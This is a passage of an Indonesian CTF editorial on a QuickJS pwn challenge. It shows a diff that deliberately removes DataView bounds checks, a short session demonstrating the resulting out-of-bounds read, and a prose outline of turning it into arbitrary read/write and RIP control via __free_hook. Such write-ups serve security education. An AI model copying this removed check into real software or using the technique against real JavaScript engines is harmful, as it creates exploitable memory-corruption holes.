</span></span></span><span style=display:flex><span><span style=color:#e0af68;font-weight:700>@@ -47166,16 +47166,15 @@ static JSValue js_dataview_getValue(JSContext *ctx,
</span></span></span><span style=display:flex><span> {
</span></span><span style=display:flex><span>     JSTypedArray *ta;
</span></span><span style=display:flex><span>     JSArrayBuffer *abuf;
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    int is_swap, size;
</span></span></span><span style=display:flex><span><span style=color:#9ece6a;background-color:#15161e>+    int is_swap;
</span></span></span><span style=display:flex><span>     uint8_t *ptr;
</span></span><span style=display:flex><span>     uint32_t v;
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    uint64_t pos;
</span></span></span><span style=display:flex><span><span style=color:#9ece6a;background-color:#15161e>+    int64_t pos;
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     ta = JS_GetOpaque2(ctx, this_obj, JS_CLASS_DATAVIEW);
</span></span><span style=display:flex><span>     if (!ta)
</span></span><span style=display:flex><span>         return JS_EXCEPTION;
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    size = 1 &lt;&lt; typed_array_size_log2(class_id);
</span></span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    if (JS_ToIndex(ctx, &amp;pos, argv[0]))
</span></span></span><span style=display:flex><span><span style=color:#9ece6a;background-color:#15161e>+    if (JS_ToInt64Sat(ctx, &amp;pos, argv[0]))
</span></span></span><span style=display:flex><span>         return JS_EXCEPTION;
</span></span><span style=display:flex><span>     is_swap = FALSE;
</span></span><span style=display:flex><span>     if (argc &gt; 1)
</span></span><span style=display:flex><span><span style=color:#e0af68;font-weight:700>@@ -47186,8 +47185,6 @@ static JSValue js_dataview_getValue(JSContext *ctx,
</span></span></span><span style=display:flex><span>     abuf = ta-&gt;buffer-&gt;u.array_buffer;
</span></span><span style=display:flex><span>     if (abuf-&gt;detached)
</span></span><span style=display:flex><span>         return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    if ((pos + size) &gt; ta-&gt;length)
</span></span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-        return JS_ThrowRangeError(ctx, &#34;out of bound&#34;);
</span></span></span><span style=display:flex><span>     ptr = abuf-&gt;data + ta-&gt;offset + pos;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     switch(class_id) {
</span></span><span style=display:flex><span><span style=color:#e0af68;font-weight:700>@@ -47269,18 +47266,17 @@ static JSValue js_dataview_setValue(JSContext *ctx,
</span></span></span><span style=display:flex><span> {
</span></span><span style=display:flex><span>     JSTypedArray *ta;
</span></span><span style=display:flex><span>     JSArrayBuffer *abuf;
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    int is_swap, size;
</span></span></span><span style=display:flex><span><span style=color:#9ece6a;background-color:#15161e>+    int is_swap;
</span></span></span><span style=display:flex><span>     uint8_t *ptr;
</span></span><span style=display:flex><span>     uint64_t v64;
</span></span><span style=display:flex><span>     uint32_t v;
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    uint64_t pos;
</span></span></span><span style=display:flex><span><span style=color:#9ece6a;background-color:#15161e>+    int64_t pos;
</span></span></span><span style=display:flex><span>     JSValueConst val;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     ta = JS_GetOpaque2(ctx, this_obj, JS_CLASS_DATAVIEW);
</span></span><span style=display:flex><span>     if (!ta)
</span></span><span style=display:flex><span>         return JS_EXCEPTION;
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    size = 1 &lt;&lt; typed_array_size_log2(class_id);
</span></span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    if (JS_ToIndex(ctx, &amp;pos, argv[0]))
</span></span></span><span style=display:flex><span><span style=color:#9ece6a;background-color:#15161e>+    if (JS_ToInt64Sat(ctx, &amp;pos, argv[0]))
</span></span></span><span style=display:flex><span>         return JS_EXCEPTION;
</span></span><span style=display:flex><span>     val = argv[1];
</span></span><span style=display:flex><span>     v = 0; /* avoid warning */
</span></span><span style=display:flex><span><span style=color:#e0af68;font-weight:700>@@ -47321,8 +47317,6 @@ static JSValue js_dataview_setValue(JSContext *ctx,
</span></span></span><span style=display:flex><span>     abuf = ta-&gt;buffer-&gt;u.array_buffer;
</span></span><span style=display:flex><span>     if (abuf-&gt;detached)
</span></span><span style=display:flex><span>         return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
</span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-    if ((pos + size) &gt; ta-&gt;length)
</span></span></span><span style=display:flex><span><span style=color:#db4b4b;background-color:#15161e>-        return JS_ThrowRangeError(ctx, &#34;out of bound&#34;);
</span></span></span><span style=display:flex><span>     ptr = abuf-&gt;data + ta-&gt;offset + pos;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     switch(class_id) {
</span></span></code></pre></div><p>Kalau dilihat dari sisi orang yang tidak mengetahui sama sekali codebase QuickJS, hal yang pertama dilihat adalah fungsi yang diubah, <code>js_dataview_getValue</code>, dan nama file patch mengandung OOB, dari ini bisa diambil kesimpulan bahwa terdapat OOB pada fungsi <code>DataView</code> di javascript. Sedikit test run,</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>λ › ./qjs --nostd
</span></span><span style=display:flex><span>QuickJS - Type <span style=color:#9ece6a>&#34;\h&#34;</span> <span style=color:#bb9af7>for</span> <span style=color:#9ece6a>help</span>
</span></span><span style=display:flex><span>qjs &gt; <span style=color:#9ece6a>let</span> buf <span style=color:#9ece6a;font-weight:700>=</span> new ArrayBuffer<span style=color:#9ece6a;font-weight:700>(</span>64<span style=color:#9ece6a;font-weight:700>)</span>;
</span></span><span style=display:flex><span>undefined
</span></span><span style=display:flex><span>qjs &gt; <span style=color:#9ece6a>let</span> dv <span style=color:#9ece6a;font-weight:700>=</span> new DataView<span style=color:#9ece6a;font-weight:700>(</span>buf<span style=color:#9ece6a;font-weight:700>)</span>;
</span></span><span style=display:flex><span>undefined
</span></span><span style=display:flex><span>qjs &gt; dv.getFloat64<span style=color:#9ece6a;font-weight:700>(</span>-1<span style=color:#9ece6a;font-weight:700>)</span>
</span></span><span style=display:flex><span><span style=color:#e0af68>0</span>
</span></span><span style=display:flex><span>qjs &gt; dv.getFloat64<span style=color:#9ece6a;font-weight:700>(</span>-1000<span style=color:#9ece6a;font-weight:700>)</span>
</span></span><span style=display:flex><span>-4.5380154677666714e+279
</span></span></code></pre></div><p>duarr, xD. Terdapat OOB dimana seharusnya <code>dv.getFloat64(-1000)</code> mengembalikan value <code>undefined</code>, tapi <code>-4.5380154677666714e+279</code> (<code>0xc01226ed86db3332</code>). Dari yang harus dilakukan selanjutnya adalah mengubah OOB menjadi arbitrary read and write. Salah satu caranya adalah membuat &ldquo;master-slave&rdquo; buffer, dimana slave akan menjadi buffer yang menunjuk kepada arbitrary pointer dan master yang akan mengubah pointer pada slave buffer. Untuk mengetahui letak pointer dari slave buffer, bisa dilakukan dengan mencari unique value dari isi buffer dan memanfaatkan oob dari <code>DataView</code>, kalau sudah didapat posisi isi buffernya, bisa dilakukan kalkulasi offset relatif untuk mendapatkan pointer dari slave buffer. Stage selanjutnya setelah mendapatkan arbitrary RW adalah mengotrol RIP. Salah satu caranya adalah mengubah <code>__free_hook</code> ke one_gadget. Full solver, (belum dikasih komen sama sekali :v, <code>dvv</code> dan <code>dv</code> ini yang dimaksud dari master-slave)</p><h3 id=unintended-solution>unintended solution</h3><p>Kelihatannya rumit, dan ga mungkin cukup untuk lomba yang hanya 6 jam ini, tapi kok masih di rilis? Beberapa hari sebelum penyisihan dimulai, qwerty merilis <a href=http://rce.party/cracksbykim-quickJS.nfo>0day</a> dari <em>mini competition</em> yang dibuat oleh di IRC kjc. Yep, 0day ini masih berguna di soal quickie dan itu kenapa saya berani mengeluarkan soal ini meskipun waktu CTF hanya 6 jam.</p><pre tabindex=0><code></code></pre><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/editorial/>Editorial</a></li><li><a href=/tags/pwn/>Pwn</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>